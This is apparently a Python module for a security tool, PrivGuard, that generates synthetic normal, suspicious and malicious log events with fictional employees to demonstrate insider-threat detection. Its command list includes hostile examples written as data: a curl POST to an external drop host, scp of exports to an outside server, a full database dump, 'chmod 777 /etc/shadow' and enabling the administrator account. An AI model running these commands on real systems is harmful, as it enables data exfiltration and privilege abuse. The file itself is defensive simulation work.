"""
Threat Simulation Engine for PrivGuard.
Generates realistic sequences of normal, suspicious, and malicious events
to demonstrate the insider threat detection pipeline.
"""
import uuid
import random
from datetime import datetime, timedelta
from models import EventModel

# Realistic data pools
USERS = [
    {"name": "Alice Chen", "session_prefix": "alice", "dept": "Engineering"},
    {"name": "Bob Martinez", "session_prefix": "bob", "dept": "Finance"},
    {"name": "Carol Singh", "session_prefix": "carol", "dept": "HR"},
    {"name": "Dave Wilson", "session_prefix": "dave", "dept": "IT-Admin"},
    {"name": "Eve Nakamura", "session_prefix": "eve", "dept": "Contractor"},
]

NORMAL_SYSTEMS = [
    "jira-prod", "confluence-wiki", "slack-api", "github-enterprise",
    "email-server", "hr-portal", "erp-dashboard"
]

SENSITIVE_SYSTEMS = [
    "prod-database-01", "pii-data-warehouse", "financial-ledger",
    "secrets-vault", "ad-domain-controller", "tier0-dc-master"
]

NORMAL_OBJECTS = [
    "project_tasks", "wiki_page", "team_channel", "code_repo",
    "inbox", "employee_profile", "sales_report"
]

SENSITIVE_OBJECTS = [
    "customers_pii_table", "ssn_records", "credit_card_vault",
    "salary_database", "encryption_keys", "admin_credentials"
]

COMMANDS_NORMAL = [
    "SELECT name FROM projects WHERE status='active'",
    "git pull origin main",
    "GET /api/tasks",
    "ls -la /home/user/documents",
]

COMMANDS_SUSPICIOUS = [
    "SELECT * FROM customers LIMIT 10000",
    "mysqldump --all-databases",
    "net user administrator /active:yes",
    "chmod 777 /etc/shadow",
    "curl -X POST https://external-drop.io/upload",
    "scp -r /data/exports external-server:/tmp/",
]


def _make_session_id(user_prefix: str, index: int) -> uuid.UUID:
    """Generate a deterministic but unique session UUID per user."""
    return uuid.uuid5(uuid.NAMESPACE_DNS, f"{user_prefix}-session-{index}")


def generate_normal_events(count: int = 10, base_time: datetime = None) -> list[dict]:
    """Generate normal business-hours activity events."""
    if base_time is None:
        base_time = datetime.utcnow().replace(hour=10, minute=0, second=0, microsecond=0)
    
    events = []
    for i in range(count):
        user = random.choice(USERS[:3])  # Normal users only
        hour_offset = random.randint(0, 7)  # 10:00 - 17:00
        minute_offset = random.randint(0, 59)
        event_time = base_time + timedelta(hours=hour_offset, minutes=minute_offset, seconds=i * 30)
        
        events.append({
            "event_id": str(uuid.uuid4()),
            "session_id": str(_make_session_id(user["session_prefix"], i % 3)),
            "timestamp": event_time.isoformat() + "Z",
            "event_type": random.choice(["login", "query", "file_access"]),
            "target_system": random.choice(NORMAL_SYSTEMS),
            "target_object": random.choice(NORMAL_OBJECTS),
            "bytes_transferred": random.randint(50, 2000),
            "command_text": random.choice(COMMANDS_NORMAL),
            "result_status": "success",
            "_meta": {
                "user_name": user["name"],
                "department": user["dept"],
                "scenario": "normal"
            }
        })
    
    return events


def generate_suspicious_events(count: int = 5, base_time: datetime = None) -> list[dict]:
    """Generate suspicious after-hours or unusual-volume events."""
    if base_time is None:
        base_time = datetime.utcnow().replace(hour=21, minute=0, second=0, microsecond=0)
    
    events = []
    for i in range(count):
        user = random.choice(USERS[2:4])  # HR or IT-Admin
        hour_offset = random.randint(0, 3)  # 21:00 - 00:00
        event_time = base_time + timedelta(hours=hour_offset, minutes=random.randint(0, 59), seconds=i * 15)
        
        events.append({
            "event_id": str(uuid.uuid4()),
            "session_id": str(_make_session_id(user["session_prefix"], i + 10)),
            "timestamp": event_time.isoformat() + "Z",
            "event_type": random.choice(["export", "query", "command"]),
            "target_system": random.choice(SENSITIVE_SYSTEMS[:3]),
            "target_object": random.choice(SENSITIVE_OBJECTS[:3]),
            "bytes_transferred": random.randint(5000, 15000),
            "command_text": random.choice(COMMANDS_SUSPICIOUS[:3]),
            "result_status": "success",
            "_meta": {
                "user_name": user["name"],
                "department": user["dept"],
                "scenario": "suspicious"
            }
        })
    
    return events


def generate_malicious_events(count: int = 5, base_time: datetime = None) -> list[dict]:
    """Generate clearly malicious events — data exfiltration, privilege escalation."""
    if base_time is None:
        base_time = datetime.utcnow().replace(hour=3, minute=0, second=0, microsecond=0)
    
    events = []
    for i in range(count):
        user = USERS[4]  # Eve the contractor — insider threat actor
        minute_offset = random.randint(0, 30)
        event_time = base_time + timedelta(minutes=minute_offset, seconds=i * 10)
        
        events.append({
            "event_id": str(uuid.uuid4()),
            "session_id": str(_make_session_id(user["session_prefix"], i + 20)),
            "timestamp": event_time.isoformat() + "Z",
            "event_type": random.choice(["export", "command", "privilege_grant"]),
            "target_system": random.choice(SENSITIVE_SYSTEMS[3:]),
            "target_object": random.choice(SENSITIVE_OBJECTS[3:]),
            "bytes_transferred": random.randint(50000, 500000),
            "command_text": random.choice(COMMANDS_SUSPICIOUS[3:]),
            "result_status": random.choice(["success", "success", "blocked"]),
            "_meta": {
                "user_name": user["name"],
                "department": user["dept"],
                "scenario": "malicious"
            }
        })
    
    return events


def generate_full_simulation() -> list[dict]:
    """
    Generate a complete attack scenario timeline:
    1. Normal activity (baseline)
    2. Suspicious probing
    3. Full malicious attack
    """
    now = datetime.utcnow()
    
    normal = generate_normal_events(10, base_time=now.replace(hour=9, minute=0))
    suspicious = generate_suspicious_events(5, base_time=now.replace(hour=21, minute=0))
    malicious = generate_malicious_events(5, base_time=now.replace(hour=3, minute=0) + timedelta(days=1))
    
    all_events = normal + suspicious + malicious
    return all_events
